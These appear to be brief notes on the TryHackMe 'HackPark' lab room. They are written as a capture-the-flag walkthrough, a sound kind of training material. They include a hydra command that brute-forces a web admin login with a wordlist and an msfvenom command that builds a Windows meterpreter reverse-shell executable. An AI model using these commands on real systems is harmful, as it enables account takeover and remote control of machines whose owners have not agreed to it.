# room
https://tryhackme.com/room/hackpark

# task 1 - intro
* intro
* identify the clown

# task 2 - using hydra
* identify the login form method, right click on login button and select inspect
* identify the login form URL, navigate to the login form from the home page
* identify the login form format, capture a login request in burp and copy the entire VIEWSTATE message
* use hydra to brute force using the form method, URL, and form data from the above
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/hackpark]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.96.224 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=wycBR6wJ5hgRRXGRPm9B729vO3xseznEkHsGQfYXrIFt63TLtn6hv5MyxyZqQAnoE1T92XAowpjL45P4onwvi%2F2NRjOqvN%2FEK1VLSP6C%2F%2FQ%2BCuLpsv%2BAH28dXh%2BFMYBfLrXSHAZkD9OP6p1lMV%2Fdm5cFiavGho654ik4hFp8SsGrMiey&__EVENTVALIDATION=GGKtPTdTjDB0dv%2BJYqJLMrMEFQ%2BiuwzDc72MsQ7Qt5ffSczFFSqHkf4%2BeV%2FOnhXmBUAIrw%2B7sQFrP7CqnFPIhtPFJSSwnMG4AV9reSa%2F9b2Tv2mmt0GpNoGqOMOpYiHfJ57ubQLf9czW7B5DBZOv7FCFB%2BHUpC6egfGgEVNtfTwexK0U&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
```

# task 3 - compromise the machine
```
msfvenom -p windows/x64/meterpreter_reverse_tcp -f exe LHOST=[ip] LPORT=[port] > shell.exe
```

# task 4 - windows privilege escalation
windows privilege escalation

# task 5 - privilege escalation without metasploit
privilege escalation without metasploit